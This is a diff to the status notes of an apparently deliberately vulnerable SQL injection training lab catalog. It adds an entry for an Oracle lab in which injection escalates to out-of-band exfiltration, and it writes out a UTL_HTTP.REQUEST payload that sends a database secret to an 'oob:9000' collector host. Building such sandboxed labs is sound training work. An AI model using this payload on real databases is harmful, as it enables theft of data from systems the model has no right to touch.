@@ -79,6 +79,19 @@ Node-alpine multi-stage with the bundled npm stripped from the runtime; Ruby-sli
 with `pg` compiled from source and the stale default `resolv` gemspec dropped) are
 documented in each lab's `SOLUTION.md` and the `CHANGELOG`.
 
+### batch/track-sqli-d-oracle-oob (this batch — 2nd heavy lab, first Oracle)
+
+- `sqli-oob-dns-oracle-utlhttp` (**expert**, `resource_tier: heavy`) — SQLi in Flask+python-oracledb
+  reports endpoint escalating to Oracle **UTL_HTTP OOB exfil**. Response is a fixed "found N reports"
+  summary with no error text + ~100-600ms jitter (in-band read is dead). Injection: scalar-subquery
+  `UTL_HTTP.REQUEST('http://oob:9000/x='||oracle_secret)` in the WHERE-clause concat — Oracle evaluates
+  it as a side effect. `/oob/received` (app-side proxy) shows the exfil. 3-service compose (app + Oracle
+  21c XE + OOB collector), egress-drop backend network (live-verified db→1.1.1.1 Network unreachable,
+  db→oob:9000 works). Empirically verified Oracle hardening pattern: rootfs `read_only:true`, anonymous
+  volumes auto-populate `/opt/oracle/{oradata,dbs,homes,admin,diag}` from image, `/tmp:exec` +
+  `/var/tmp:exec` tmpfs for JNA+TNS IPC. posture all 3 + own-image Trivy gates green, app 160 MB (Oracle
+  pulled engine 4.4 GB, not size-capped), exploit exit 0 in ~1.4s.
+
 ### batch/track-sqli-d-heavy-infra-plus-es (this batch — infra + 1 heavy lab)
 
 - **Shared infra:** new `resource_tier: 'standard' | 'heavy'` optional field in meta.schema.json;
@@ -150,9 +163,8 @@ http://oob:9000/x'` (superuser INTENTIONAL; table-source COPY has no `SELECT`, b
 
 ## Scheduled (future batches, Linux-feasible)
 
-**Implemented: 23/25.** The heavy-tier lane (`resource_tier: heavy` field +
-`.github/workflows/heavy-nightly.yml`) is now live; Elasticsearch is the first
-heavy lab. Remaining 2 catalog entries are the heavy-tier MSSQL / Oracle labs (Windows-container MSSQL/Fortinet/MoVEit and
+**Implemented: 24/25.** Second heavy lab (Oracle 21c XE + UTL_HTTP OOB) live in
+the nightly matrix. Remaining 1 catalog entry: heavy-tier MSSQL xp_cmdshell (Windows-container MSSQL/Fortinet/MoVEit and
 heavy-tier Oracle/Elasticsearch). `sqli-postgres-copy-program-rce-chain` shipped as
 a `risk: low` egress-dropped RCE lab (COPY FROM PROGRAM needs no added caps). Pending the
 operator's charter decision (abstract onto a Linux stack, grant a heavy
@@ -165,7 +177,6 @@ These catalog labs cannot run under the platform's constraints (Linux Docker hos
 re-platform decision** (abstract the vuln class onto a Linux-runnable stack):
 
 - `sqli-mssql-stacked-xp-cmdshell` — specifies **Windows Nano Server** (Windows container; cannot run on a Linux host).
-- `sqli-oob-dns-oracle-utlhttp` — **Oracle 21c XE** (~2–4 GB image, 60–120 s start; blows size/time gates).
 
 Proposed resolution: re-platform the MSSQL/Oracle/Elasticsearch labs onto Linux-runnable
 equivalents that teach the same primitive (stacked queries / OOB exfil / DSL injection),
